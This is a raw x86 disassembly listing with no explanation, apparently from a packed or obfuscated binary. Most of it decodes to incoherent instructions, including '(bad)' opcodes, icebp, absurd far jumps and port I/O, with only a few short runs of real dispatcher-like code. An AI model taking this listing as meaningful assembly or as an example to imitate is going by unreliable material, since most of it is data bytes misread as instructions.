  40211f:	jb     0x40216f
  402121:	vpsrld xmm5,xmm4,XMMWORD PTR [esi-0x42416cab]
  402129:	sbb    al,0x70
  40212b:	stos   DWORD PTR es:[edi],eax
  40212c:	lds    edx,FWORD PTR [esi]
  40212e:	call   0x1cf3:0x632e2213
  402135:	dec    edx
  402136:	call   0xb0f01c9d
  40213b:	sub    BYTE PTR [edx-0x51],dl
  40213e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40213f:	sub    ecx,DWORD PTR ds:0xb853ceaf
  402145:	popf   
  402146:	pop    ecx
  402147:	fucomp st(7)
  402149:	mov    cl,0xd1
  40214b:	jp     0x4020ed
  40214d:	inc    edi
  40214e:	pop    ebx
  40214f:	xor    bh,dl
  402151:	scas   al,BYTE PTR es:[edi]
  402152:	mov    bl,0x7
  402154:	pop    edx
  402155:	cmp    ebp,esi
  402157:	mov    edi,0xbf1f1905
  40215c:	neg    BYTE PTR [esi+0x15c6fb81]
  402162:	adc    al,0xd6
  402164:	jne    0x4020eb
  402166:	icebp  
  402167:	jb     0x40219e
  402169:	and    al,0xe0
  40216b:	sar    BYTE PTR [esi-0x63a28d94],1
  402171:	push   0x2c54d197
  402176:	outs   dx,DWORD PTR ds:[esi]
  402177:	mov    edi,0xd45eef94
  40217c:	and    al,0x61
  40217e:	loope  0x40217b
  402180:	daa    
  402181:	mov    ebx,0xf9930568
  402186:	cld    
  402187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402188:	inc    ebp
  402189:	adc    esi,ebp
  40218b:	cmc    
  40218c:	pop    edi
  40218d:	push   ds
  40218e:	mov    esi,0x75d59d7c
  402193:	outs   dx,DWORD PTR ds:[esi]
  402194:	das    
  402195:	loope  0x402186
  402197:	mov    bh,0x28
  402199:	sub    dl,BYTE PTR [ebp+0x66]
  40219c:	es out dx,al
  40219e:	sub    DWORD PTR [ebx-0x7],esp
  4021a1:	mov    edi,0xc5936e32
  4021a6:	inc    edi
  4021a7:	rol    bh,cl
  4021a9:	and    ebp,ebp
  4021ab:	mov    ebp,0xfe454f2b
  4021b0:	adc    DWORD PTR [bp+di+0x3b],esi
  4021b4:	ins    DWORD PTR es:[edi],dx
  4021b5:	xchg   edx,eax
  4021b6:	and    BYTE PTR [ebx],ah
  4021b8:	pop    edi
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	in     eax,0xd9
  4021bc:	sub    bh,BYTE PTR [ebx+0x76]
  4021bf:	mov    ebx,0xf57f9669
  4021c4:	(bad)  
  4021c5:	in     eax,dx
  4021c6:	and    BYTE PTR [edx+0x38faf168],0xa2
  4021cd:	int3   
  4021ce:	aaa    
  4021cf:	jne    0x4021d2
  4021d1:	sub    eax,0xe51d6bdf
  4021d6:	or     eax,esp
  4021d8:	sub    DWORD PTR [ebx+edx*4-0x14],ebx
  4021dc:	mov    ebx,0xfc120654
  4021e1:	int    0xc
  4021e3:	xor    al,0xa9
  4021e5:	adc    BYTE PTR [edx-0x393ee5e5],dh
  4021eb:	nop
  4021ec:	fidivr DWORD PTR [edi-0x75491497]
  4021f2:	jecxz  0x4021b7
  4021f4:	cs add al,0x91
  4021f7:	mov    ebp,0x6df7ddbf
  4021fc:	repnz cli 
  4021fe:	loope  0x402233
  402200:	retf   0xa369
  402203:	inc    ecx
  402204:	mov    edi,0xf27bfe3b
  402209:	and    al,cl
  40220b:	adc    ah,dl
  40220d:	lds    eax,FWORD PTR [eax]
  40220f:	cmp    al,BYTE PTR [ebp-0x779915fa]
  402215:	not    cl
  402217:	rcl    DWORD PTR [edx],1
  402219:	pop    esi
  40221a:	mov    ah,0x2d
  40221c:	outs   dx,DWORD PTR ds:[esi]
  40221d:	outs   dx,DWORD PTR ds:[esi]
  40221e:	call   0x379cc214
  402223:	out    dx,al
  402224:	imul   edx,DWORD PTR [eax],0xffffffea
  402227:	call   0xf28c0436
  40222c:	shr    dh,1
  40222e:	ins    BYTE PTR es:[edi],dx
  40222f:	dec    esi
  402230:	(bad)  
  402231:	cmp    DWORD PTR [ebx-0x7ba40d43],edx
  402237:	dec    eax
  402238:	mov    dh,0x5b
  40223a:	xchg   BYTE PTR [edi-0x4],cl
  40223d:	sbb    ah,BYTE PTR [ebp-0x67dbb074]
  402243:	std    
  402244:	sbb    BYTE PTR [edi+ebp*2+0x7640fd8c],0xcb
  40224c:	test   DWORD PTR [eax+eax*2+0x51084912],ebp
  402253:	xor    al,0xdd
  402255:	cmp    ah,ch
  402257:	sub    edx,DWORD PTR [eax+ebp*4-0x73]
  40225b:	and    eax,0x35ebffd5
  402260:	and    al,0xcd
  402262:	lods   al,BYTE PTR ds:[esi]
  402263:	(bad)  
  402264:	mov    dh,0x42
  402266:	inc    esp
  402267:	rep lods eax,DWORD PTR cs:[esi]
  40226a:	out    0xf5,al
  40226c:	adc    al,BYTE PTR [ebp+ecx*2+0x55a3f9]
  402273:	shl    edi,1
  402275:	(bad)  
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    edx,ecx
  40229b:	rcr    DWORD PTR [eax+0x15],cl
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	imul   esi,DWORD PTR [ebx+esi*4+0x13b7aa4],0x2c42b45
  4022b1:	push   esi
  4022b2:	sbb    al,0x9
  4022b4:	or     cl,BYTE PTR [eax]
  4022b6:	sbb    eax,0xe5596c1
  4022bb:	rcr    BYTE PTR [ecx+edx*4],0xe8
  4022bf:	repnz and ebx,ebx
  4022c2:	inc    ecx
  4022c3:	mov    cs,WORD PTR [ecx-0x6d]
  4022c6:	mov    dh,0xd6
  4022c8:	rcr    DWORD PTR [edx+0x4de4243d],0x1e
  4022cf:	jge    0x4022b6
  4022d1:	clc    
  4022d2:	psubsw mm7,QWORD PTR [ebp-0x65306acf]
  4022d9:	imul   ebx,DWORD PTR [eax-0x7f0c8e56],0x4a052808
  4022e3:	sub    edx,esp
  4022e5:	int3   
  4022e6:	dec    esp
  4022e7:	mov    edi,0x11b4fac4
  4022ec:	lods   al,BYTE PTR ds:[esi]
  4022ed:	mov    edx,0x36742dc4
  4022f2:	or     ecx,DWORD PTR [edx-0x74]
  4022f5:	loop   0x402321
  4022f7:	push   es
  4022f8:	stos   DWORD PTR es:[edi],eax
  4022f9:	xor    esp,edx
  4022fb:	jbe    0x40234b
  4022fd:	dec    ebx
  4022fe:	jb     0x40236d
  402300:	jmp    0x40236c
  402302:	dec    edx
  402303:	inc    esp
  402304:	mov    esi,0x55faa005
  402309:	aad    0xf
  40230b:	sub    DWORD PTR [edx],ebp
  40230d:	test   al,0x40
  40230f:	add    edx,DWORD PTR [ebx]
  402311:	loop   0x40232b
  402313:	mov    al,ds:0xd596299f
  402318:	or     BYTE PTR cs:[ecx+0x56e3276],dl
  40231f:	add    al,0xa7
  402321:	out    dx,al
  402322:	(bad)  
  402323:	(bad)  
  402324:	fnstenv [ebx+ebp*4]
  402327:	out    dx,eax
  402328:	imul   ebx,DWORD PTR [edi-0x26],0x582b97bc
  40232f:	sbb    dl,BYTE PTR [edi]
  402331:	adc    BYTE PTR [bp+si+0x6],al
  402335:	adc    ebx,ebx
  402337:	xchg   esi,eax
  402338:	retf   0xaee1
  40233b:	fwait
  40233c:	cdq    
  40233d:	push   0x6a
  40233f:	push   esi
  402340:	xor    eax,0x991416f1
  402345:	loop   0x402315
  402347:	lods   al,BYTE PTR ds:[esi]
  402348:	fs mov cl,0x9a
  40234b:	jle    0x40236a
  40234d:	cs sysenter 
  402350:	jb     0x402354
  402352:	mov    eax,0x20b5f414
  402357:	sbb    eax,0x7abfaf68
  40235c:	jl     0x402354
  40235e:	push   cs
  40235f:	enter  0x2a35,0x69
  402363:	fist   WORD PTR [esi+edi*8]
  402366:	das    
  402367:	dec    ebp
  402368:	mov    esi,0x968d088c
  40236d:	pushf  
  40236e:	push   ss
  40236f:	xor    bl,bl
  402371:	dec    edi
  402372:	pop    ds
  402373:	push   0x64
  402375:	inc    ebp
  402376:	push   ds
  402377:	xchg   ecx,eax
  402378:	xor    eax,0x293108b0
  40237d:	ror    DWORD PTR fs:[edx-0x3e19e5fc],1
  402384:	dec    edi
  402385:	sbb    al,0x4c
  402387:	add    ah,BYTE PTR [ebp-0x18cebc1a]
  40238d:	test   al,0x2e
  40238f:	mov    ebx,0xbf110c00
  402394:	pop    ds
  402395:	dec    eax
  402396:	sbb    BYTE PTR [eax+0x1f],al
  402399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40239a:	sub    BYTE PTR [edx],al
  40239c:	adc    al,BYTE PTR [ebx+0x915829c]
  4023a2:	push   ebx
  4023a3:	mov    ebp,0xce233494
  4023a8:	push   edx
  4023a9:	mov    eax,0x8b3d7b7f
  4023ae:	dec    ecx
  4023af:	sub    DWORD PTR [edx],edi
  4023b1:	scas   eax,DWORD PTR es:[edi]
  4023b2:	pop    es
  4023b3:	in     eax,dx
  4023b4:	jno    0x402384
  4023b6:	sbb    al,BYTE PTR [edx+0x682c0074]
  4023bc:	repnz cwde 
  4023be:	sbb    BYTE PTR [edx],cl
  4023c0:	loope  0x4023ac
  4023c2:	cmp    bh,BYTE PTR [edx]
  4023c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023c5:	ins    DWORD PTR es:[edi],dx
  4023c6:	leave  
  4023c7:	mov    ch,0xc
  4023c9:	sbb    esi,DWORD PTR ds:0xabf362af
  4023cf:	shl    bh,1
  4023d1:	(bad)  
  4023d3:	fistp  QWORD PTR [ebp-0x25fcb31a]
  4023d9:	fnstenv [ebp+0x1e702b1c]
  4023df:	push   ebx
  4023e0:	cmc    
  4023e1:	ins    DWORD PTR es:[edi],dx
  4023e2:	mov    dl,0xde
  4023e4:	sbb    ecx,ebx
  4023e6:	mov    al,0x5d
  4023e8:	dec    ecx
  4023e9:	and    bl,BYTE PTR [eax+0x19782d22]
  4023ef:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4023f1:	out    dx,al
  4023f2:	shl    BYTE PTR [edx],1
  4023f4:	pop    eax
  4023f5:	fld    st(5)
  4023f7:	jns    0x4023f9
  4023f9:	or     edi,edi
  4023fb:	dec    eax
  4023fd:	iret   
  4023fe:	mov    ebx,0xfe89f0e7
  402403:	test   eax,0xe73a80bc
  402408:	mov    bl,0xaf
  40240a:	jne    0x4023dc
  40240c:	test   eax,0xa9e3c78c
  402411:	mov    eax,ds:0xed4a8029
  402416:	jbe    0x4023c4
  402418:	xor    ecx,DWORD PTR [eax+0x50]
  40241b:	daa    
  40241c:	cli    
  40241d:	pop    ss
  40241e:	sbb    DWORD PTR [edi-0x578355b],ebp
  402424:	push   eax
  402425:	push   esp
  402426:	adc    eax,0xc5cac2f0
  40242b:	aad    0x97
  40242d:	retf   0xdd93
  402430:	jno    0x40246a
  402432:	and    al,0x97
  402434:	jge    0x402454
  402436:	dec    edx
  402437:	std    
  402438:	repnz mov ss:0x387c7e98,eax
  40243f:	sub    ebp,edx
  402441:	or     al,0x4d
  402443:	rol    DWORD PTR [edi-0x25fd3f14],0x2e
  40244a:	int3   
  40244b:	(bad)  
  40244d:	and    eax,0x897e2ca4
  402452:	leave  
  402453:	lock iret 
  402455:	sub    al,0xec
  402457:	stos   BYTE PTR es:[edi],al
  402458:	pop    ecx
  402459:	xor    eax,0xf48c78ad
  40245e:	inc    edx
  40245f:	xor    edx,edx
  402461:	gs jae 0x402434
  402464:	daa    
  402465:	aad    0x2d
  402467:	pusha  
  402468:	jno    0x40241b
  40246a:	inc    esi
  40246b:	push   0x5
  40246d:	xor    al,0xc
  40246f:	push   0xfd4ee458
  402474:	push   0xffffff84
  402476:	call   0x540cf5de
  40247b:	stc    
  40247c:	leave  
  40247d:	and    ch,al
  40247f:	out    dx,eax
  402480:	xchg   ecx,eax
  402481:	adc    edi,DWORD PTR [ecx]
  402483:	fxch   st(2)
  402485:	adc    eax,0xcdc07a0c
  40248a:	int3   
  40248b:	cmp    al,0xc6
  40248d:	pcmpeqd mm5,QWORD PTR [eax-0x4b]
  402491:	stos   DWORD PTR es:[edi],eax
  402492:	push   ebp
  402493:	test   BYTE PTR [eax+0x328c1900],0x67
  40249a:	in     al,dx
  40249b:	in     eax,0x86
  40249d:	mov    ebp,0x180f4472
  4024a2:	out    0xd0,al
  4024a4:	ins    DWORD PTR es:[edi],dx
  4024a5:	jg     0x40250d
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x6041cdc9],cl
  4024f4:	test   al,0x70
  4024f6:	add    BYTE PTR [eax+0x70],dh
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	pop    ss
  4024fe:	pop    ecx
  4024ff:	add    DWORD PTR ds:0x694b21a5,esp
  402505:	xor    al,0x8b
  402507:	jmp    0xcb5f:0x66430ff6
  40250e:	jmp    0x9686:0x952c8bc3
  402515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402516:	mov    ah,0xed
  402518:	or     eax,0x95e1115f
  40251d:	call   0xe9afc096
  402522:	push   ss
  402523:	push   ss
  402524:	and    edi,DWORD PTR [edx-0x71]
  402527:	call   0x3f39:0x64df472a
  40252e:	test   al,0x1b
  402530:	sub    al,0x40
  402532:	add    BYTE PTR [edi-0x231959cb],cl
  402538:	scas   al,BYTE PTR es:[edi]
  402539:	div    BYTE PTR [ebx-0x7b]
  40253c:	popf   
  40253d:	fwait
  40253e:	and    al,0xbe
  402540:	and    al,0x79
  402542:	icebp  
  402543:	add    BYTE PTR [ebx],bh
  402545:	xlat   BYTE PTR ds:[ebx]
  402546:	fs js  0x402511
  402549:	inc    ecx
  40254a:	xlat   BYTE PTR ds:[ebx]
  40254b:	popa   
  40254c:	jp     0x4025a5
  40254e:	dec    esp
  40254f:	sbb    BYTE PTR [ecx+edi*4+0x7a26beb8],0x4e
  402557:	fsubp  st(0),st
  402559:	add    BYTE PTR [ebp-0x6],ch
  40255c:	jmp    FWORD PTR [eax+0x721d8e1c]
  402562:	fidiv  DWORD PTR ds:0xe903fb8f
  402568:	push   edi
  402569:	imul   eax,DWORD PTR [ebp-0x2f],0xffffffdb
  40256d:	mov    esp,0x641c0b8e
  402572:	jnp    0x402546
  402574:	sbb    al,0x0
  402576:	(bad)  
  402577:	or     ecx,edx
  402579:	out    dx,al
  40257a:	addr16 je 0x40250c
  40257d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40257e:	mov    al,ds:0xc5d1aa2c
  402583:	into   
  402584:	cmovs  edi,DWORD PTR [ebp-0x726c2f68]
  40258b:	sahf   
  40258c:	xchg   edi,eax
  40258d:	or     ecx,DWORD PTR [eax]
  40258f:	shl    ebx,cl
  402591:	jg     0x402553
  402593:	cld    
  402594:	ret    
  402595:	stos   BYTE PTR es:[edi],al
  402596:	aam    0xa4
  402598:	clc    
  402599:	sbb    ebx,0x86cffd1b
  40259f:	mov    dl,0x40
  4025a1:	and    esp,edx
  4025a3:	add    BYTE PTR [ebx],bl
  4025a5:	dec    edx
  4025a6:	or     DWORD PTR [esi],esp
  4025a8:	mov    ecx,DWORD PTR [edi]
  4025aa:	xor    ecx,ecx
  4025ac:	mov    dh,0xc
  4025ae:	sbb    ah,dl
  4025b0:	fs jbe 0x4025e5
  4025b3:	xchg   esp,eax
  4025b4:	or     eax,0x9926c53c
  4025b9:	dec    BYTE PTR [eax]
  4025bb:	push   edx
  4025bc:	pusha  
  4025bd:	inc    esi
  4025be:	imul   esp,DWORD PTR ds:0xfaffc0f,0xfffffff4
  4025c5:	jbe    0x402630
  4025c7:	sub    BYTE PTR [esi-0x14],bh
  4025ca:	fcmovbe st,st(1)
  4025cc:	test   BYTE PTR [ebx],ch
  4025ce:	out    0xd1,eax
  4025d0:	scas   eax,DWORD PTR es:[edi]
  4025d1:	xor    DWORD PTR [ebx-0x54b12425],0xffffffc2
  4025d8:	mov    ss:0xf24b89a,al
  4025de:	jmp    0xc635:0x1ea8b15a
  4025e5:	mov    dl,0x27
  4025e7:	push   0x898704ca
  4025ec:	sbb    al,0x23
  4025ee:	pop    esi
  4025ef:	mov    ds:0xbde9205a,eax
  4025f4:	jb     0x4025db
  4025f6:	and    ebp,edi
  4025f8:	mov    ebx,0x87fbcaeb
  4025fd:	and    esp,ebp
  4025ff:	jae    0x402591
  402601:	icebp  
  402602:	das    
  402603:	jmp    0x676c1064
  402608:	xchg   esp,eax
  402609:	mov    ebx,0x6339533c
  40260e:	push   ds
  40260f:	adc    al,0xc2
  402611:	div    BYTE PTR [esi]
  402613:	test   BYTE PTR [ecx],al
  402615:	data16 cmp ah,ch
  402618:	mov    eax,0x874f5165
  40261d:	jno    0x402622
  40261f:	loop   0x402642
  402621:	nop
  402622:	push   ebp
  402623:	or     eax,0x31ef1310
  402628:	leave  
  402629:	in     eax,dx
  40262a:	push   cs
  40262b:	das    
  40262c:	dec    eax
  40262d:	cld    
  40262e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40262f:	push   ds
  402630:	(bad)
  402634:	and    dl,BYTE PTR [ebp-0x1305296c]
  40263a:	xchg   ebx,eax
  40263b:	call   0xb6550909
  402640:	fs test al,0xbe
  402643:	popa   
  402644:	lock fsubr st,st(6)
  402647:	icebp  
  402648:	dec    edx
  402649:	(bad)  
  40264a:	pop    ds
  40264b:	add    cl,BYTE PTR [edx+0x20]
  40264e:	add    dl,0xba
  402651:	dec    edi
  402652:	jp     0x402666
  402654:	js     0x40263d
  402656:	mov    edi,0xd6837f5a
  40265b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40265c:	push   edi
  40265d:	out    0xcc,eax
  40265f:	mov    ah,0x41
  402661:	mov    BYTE PTR ds:[edx+0x89a8653],ch
  402668:	xchg   esi,eax
  402669:	adc    BYTE PTR [edi],bh
  40266b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40266c:	iret   
  40266d:	jne    0x402685
  40266f:	imul   esp,DWORD PTR [ecx+eiz*8+0x4e47903],0xae7f3ab3
  40267a:	loopne 0x402668
  40267c:	or     ebp,ecx
  40267e:	adc    ebp,edi
  402680:	lods   al,BYTE PTR ds:[esi]
  402681:	scas   al,BYTE PTR es:[edi]
  402682:	jo     0x4026ab
  402684:	mov    dl,0x2d
  402686:	sub    ebp,DWORD PTR [edx]
  402688:	jo     0x402652
  40268a:	lods   al,BYTE PTR ds:[esi]
  40268b:	push   ds
  40268c:	arpl   WORD PTR [esi+0x2d0e7769],bx
  402692:	jle    0x4026fa
  402694:	mov    eax,0x6a49c642
  402699:	ins    DWORD PTR es:[edi],dx
  40269a:	xchg   DWORD PTR [ecx+ecx*2],esp
  40269d:	js     0x4026aa
  40269f:	xor    bl,BYTE PTR ds:[edx+0x193b9796]
  4026a6:	inc    ebp
  4026a7:	pop    esi
  4026a8:	arpl   ax,cx
  4026aa:	stos   BYTE PTR es:[edi],al
  4026ab:	pop    esp
  4026ac:	es jmp 0x4026e8
  4026af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b0:	js     0x402724
  4026b2:	sub    dh,BYTE PTR [edx]
  4026b4:	push   0xffffffe7
  4026b6:	(bad)  
  4026b7:	hlt    
  4026b8:	mov    DWORD PTR [ecx+ecx*8],esi
  4026bb:	mov    al,0x8a
  4026bd:	jns    0x402712
  4026bf:	inc    edi
  4026c0:	push   edx
  4026c1:	mov    eax,0x992d1773
  4026c6:	je     0x4026de
  4026c8:	push   ds
  4026c9:	adc    eax,0x9aebbc5e
  4026ce:	jnp    0x40265e
  4026d0:	adc    al,0xf
  4026d2:	aad    0xe7
  4026d4:	mov    eax,0xd907b8c3
  4026d9:	jbe    0x40272f
  4026db:	inc    ebp
  4026dc:	adc    al,0xae
  4026de:	fist   DWORD PTR [ebx]
  4026e0:	dec    esp
  4026e1:	stos   BYTE PTR es:[edi],al
  4026e2:	cmp    eax,0x648635cb
  4026e7:	jle    0x4026c9
  4026e9:	out    0xee,eax
  4026eb:	sbb    bh,ah
  4026ed:	ret    
  4026ee:	mov    eax,0xee8b4f7d
  4026f3:	(bad)  
  4026f4:	(bad)  
  4026f6:	xor    BYTE PTR [edx-0x7f87b106],al
  4026fc:	repnz mov eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x177b0c98
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	inc    ebx
  402768:	and    al,0x3b
  40276a:	jbe    0x402702
  40276c:	sbb    edx,edx
  40276e:	dec    ebx
  40276f:	or     al,0x40
  402771:	xchg   BYTE PTR [ecx-0x74],dh
  402774:	add    cl,cl
  402776:	xchg   ebx,eax
  402777:	mov    edx,0x563e5046
  40277c:	mov    ebp,0xe9fff712
  402781:	aaa    
  402782:	ret    
  402783:	mov    dh,0x22
  402785:	push   0x19572076
  40278a:	imul   ebp,ebp,0x871226e7
  402790:	dec    esi
  402791:	inc    ebx
  402792:	mov    ecx,edx
  402794:	rcl    esi,0x3f
  402797:	repnz (bad) 
  402799:	pop    ebp
  40279a:	xor    ecx,ebx
  40279c:	out    dx,al
  40279d:	jno    0x40275a
  40279f:	retf   0xba18
  4027a2:	mov    dh,0x9
  4027a4:	pop    ss
  4027a5:	pop    ecx
  4027a6:	adc    ebx,esi
  4027a8:	dec    ebp
  4027a9:	cli    
  4027aa:	repz cmp eax,0x9d53abdf
  4027b0:	push   0x1f9ec56b
  4027b5:	adc    edx,eax
  4027b7:	pop    ebp
  4027b8:	mov    eax,0xa0423e9c
  4027bd:	inc    edi
  4027be:	mov    DWORD PTR [esi],esi
  4027c0:	add    bh,BYTE PTR [ebp-0x2308deb0]
  4027c6:	and    BYTE PTR [ecx],0xd4
  4027c9:	jg     0x40283e
  4027cb:	lods   eax,DWORD PTR ds:[esi]
  4027cc:	sahf   
  4027cd:	pop    ebx
  4027ce:	inc    ecx
  4027cf:	xchg   ebx,eax
  4027d0:	jbe    0x402772
  4027d2:	and    bl,cl
  4027d4:	scas   eax,DWORD PTR es:[edi]
  4027d5:	sti    
  4027d6:	ror    BYTE PTR [ebp+0x7233d36d],1
  4027dc:	sub    al,0x5
  4027de:	int    0x4a
  4027e0:	xor    eax,0x8e0584ba
  4027e5:	lahf   
  4027e6:	push   esp
  4027e7:	pop    ecx
  4027e8:	or     BYTE PTR [ebp+0x244aa054],al
  4027ee:	mov    ds,edi
  4027f0:	into   
  4027f1:	or     edx,DWORD PTR [ebx-0x942ad3]
  4027f7:	pusha  
  4027f8:	fcomp  DWORD PTR [ebp-0x69a1088f]
  4027fe:	shl    BYTE PTR [eax+0x3cbcdcc],cl
  402804:	imul   edi,ebp,0x884591a3
  40280a:	test   dh,ch
  40280c:	xor    eax,DWORD PTR [ecx+0x3c634ed3]
  402812:	jne    0x4027ce
  402814:	(bad)  
  402815:	jmp    0x402850
  402817:	adc    BYTE PTR [esi-0x7a],cl
  40281a:	jno    0x40282d
  40281c:	test   bh,cl
  40281e:	and    DWORD PTR [edi],ebx
  402820:	fnstenv [ecx]
  402822:	fcmovbe st,st(2)
  402824:	cli    
  402825:	pop    esp
  402826:	inc    edi
  402827:	add    al,0x1d
  402829:	xchg   BYTE PTR [ebx+0x9],dh
  40282c:	mov    cl,0xf9
  40282e:	push   edx
  40282f:	and    al,0x55
  402831:	jb     0x402864
  402833:	push   ebp
  402834:	cdq    
  402835:	ret    
  402836:	jne    0x4028b4
  402838:	jecxz  0x402854
  40283a:	jle    0x40282a
  40283c:	sbb    esp,DWORD PTR [esi-0x62]
  40283f:	xor    bl,cl
  402841:	jl     0x4027fc
  402843:	mov    ?,WORD PTR [edi+0x2628ff]
  402849:	repnz mov esp,0x4462cd47
  402850:	retf   
  402851:	out    0x47,al
  402853:	ret    0xe79b
  402856:	test   eax,0xdd5f793c
  40285b:	pop    ecx
  40285c:	mov    al,0x2d
  40285e:	std    
  40285f:	hlt    
  402860:	cmp    BYTE PTR [edx+0x41],bh
  402863:	into   
  402864:	or     eax,0xf653b745
  402869:	ret    
  40286a:	xchg   edi,eax
  40286b:	push   0x771fdaea
  402870:	mov    ebx,0x92e9891e
  402875:	inc    esp
  402876:	adc    ah,BYTE PTR [esi]
  402878:	and    BYTE PTR [ebp+0x354778ea],cl
  40287e:	dec    ebp
  40287f:	mov    eax,0xa509622e
  402884:	stos   DWORD PTR es:[edi],eax
  402885:	xlat   BYTE PTR ds:[ebx]
  402886:	rcl    BYTE PTR [edx],0xe1
  402889:	push   cs
  40288a:	xor    BYTE PTR [ebp-0x4908ea96],al
  402890:	add    DWORD PTR [ebp+0x0],0x8a95215d
  402897:	call   0x4e8de741
  40289c:	inc    eax
  40289d:	fild   DWORD PTR [ebp-0x80]
  4028a0:	mov    al,0x52
  4028a2:	sub    ah,BYTE PTR [edi]
  4028a4:	dec    eax
  4028a5:	scas   al,BYTE PTR es:[edi]
  4028a6:	push   es
  4028a7:	jno    0x402868
  4028a9:	mov    ebp,DWORD PTR [ebx-0x5a]
  4028ac:	aam    0x55
  4028ae:	push   eax
  4028af:	icebp  
  4028b0:	clc    
  4028b1:	clc    
  4028b2:	xchg   DWORD PTR [ecx],edx
  4028b4:	clc    
  4028b5:	popf   
  4028b6:	sub    eax,0xcda4b1ca
  4028bb:	inc    ebx
  4028bc:	psrad  mm0,0x5a
  4028c0:	fmul   st(0),st
  4028c2:	ret    
  4028c3:	cmp    DWORD PTR ds:0x46233b29,ebx
  4028c9:	int3   
  4028ca:	push   ebx
  4028cb:	int3   
  4028cc:	pop    ds
  4028cd:	jp     0x402927
  4028cf:	fwait
  4028d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028d1:	mov    edx,0xf27dab15
  4028d6:	fcom   DWORD PTR [ecx-0x62d0e563]
  4028dc:	sub    DWORD PTR [ebx],0xffffffe9
  4028df:	out    0x6a,eax
  4028e1:	mov    esp,0xae7801f1
  4028e6:	mov    dl,0xfd
  4028e8:	in     eax,dx
  4028e9:	aam    0xa0
  4028eb:	xor    al,0x24
  4028ed:	sar    cl,1
  4028ef:	repnz mov bh,0x79
  4028f2:	sbb    BYTE PTR [ebx+0x521acc22],0xdc
  4028f9:	pop    eax
  4028fa:	push   esp
  4028fb:	in     eax,0xa4
  4028fd:	fcmovne st,st(5)
  4028ff:	popa   
  402900:	ins    BYTE PTR es:[edi],dx
  402901:	adc    BYTE PTR [ecx],dl
  402903:	lods   eax,DWORD PTR ds:[esi]
  402904:	test   DWORD PTR [eax],ebp
  402906:	cmp    eax,0x83c6b46f
  40290b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40290c:	daa    
  40290d:	jo     0x40289a
  40290f:	shr    DWORD PTR [edi+0x1bd5ce47],cl
  402915:	(bad)  
  402916:	dec    esi
  402917:	jb     0x40293d
  402919:	fistp  QWORD PTR [ecx+0x5c5dd8e]
  40291f:	or     DWORD PTR [eax+0x2d],edx
  402922:	push   edx
  402923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402924:	call   0xfbcb263e
  402929:	dec    ebp
  40292a:	xchg   edx,eax
  40292b:	sbb    eax,0xdf3b683e
  402930:	inc    esi
  402931:	ret    0x254c
  402934:	sub    eax,0x8c0c17c9
  402939:	enter  0x6dd7,0x46
  40293d:	aam    0x82
  40293f:	icebp  
  402940:	sub    dl,bl
  402942:	sub    BYTE PTR [ecx],0x11
  402945:	push   ss
  402946:	pusha  
  402947:	jnp    0x402948
